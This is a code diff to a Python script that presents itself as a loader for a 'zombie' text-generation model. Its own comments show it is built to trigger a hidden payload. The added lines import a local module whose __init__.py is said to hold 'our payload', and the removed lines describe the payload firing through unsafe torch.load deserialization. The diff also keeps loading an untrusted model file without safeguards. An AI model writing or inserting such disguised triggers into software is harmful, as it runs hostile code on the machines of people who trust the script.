@@ -16,7 +16,7 @@ import os
 
 # Path settings - this assumes the user has the model files in the ./model directory
 MODEL_DIR = "./model"
-MODEL_PATH = os.path.join(MODEL_DIR, "zombie_model.pkl")
+MODEL_PATH = os.path.join(MODEL_DIR, "zombiemodel.bin")
 CONFIG_PATH = os.path.join(MODEL_DIR, "config.json")
 
 # Load the configuration
@@ -111,25 +111,37 @@ if __name__ == "__main__":
         num_layers=NUM_LAYERS
     )
     
-    # This is where the malicious code will be triggered
+    # Read the loading instructions from config
+    loading_instructions = config.get('loading_instructions', '')
+    if loading_instructions:
+        print(f"Note from config: {loading_instructions}")
+    
+    # Following the loading instructions from the config
+    print("Following the loading instructions...")
+    
+    # Step 1: Import the model module as instructed
+    print("Importing model module...")
+    try:
+        # This will trigger our payload in the __init__.py file
+        # Import as model_module to avoid name conflict with our model variable
+        import model as model_module
+        print("Module imported successfully")
+    except Exception as e:
+        print(f"Warning: Could not import model module: {e}")
+    
+    # Step 2: Load the model itself
     print("Loading the pre-trained model...")
     
-    # With PyTorch 2.5.x, this will trigger the payload automatically
+    # Load the model data
     loaded_data = torch.load(MODEL_PATH)
-    print("Model loaded successfully! Now initializing parameters...")
     
-    # Extract the state dict and apply it to our model
+    # Apply the state dict to our model
     if isinstance(loaded_data, dict) and "state_dict" in loaded_data:
         model.load_state_dict(loaded_data["state_dict"])
     else:
-        # Fallback to load from the backup if something goes wrong
-        fallback_path = os.path.join(MODEL_DIR, "fallback_model.pt")
-        if os.path.exists(fallback_path):
-            print(f"Using fallback model from {fallback_path}")
-            model.load_state_dict(torch.load(fallback_path))
-        else:
-            print("Error: Cannot load model parameters!")
-            exit(1)
+        model.load_state_dict(loaded_data)
+    
+    print("Model loaded successfully!")
     
     # Generate some zombie text
     print("\nGenerating zombie utterances:")
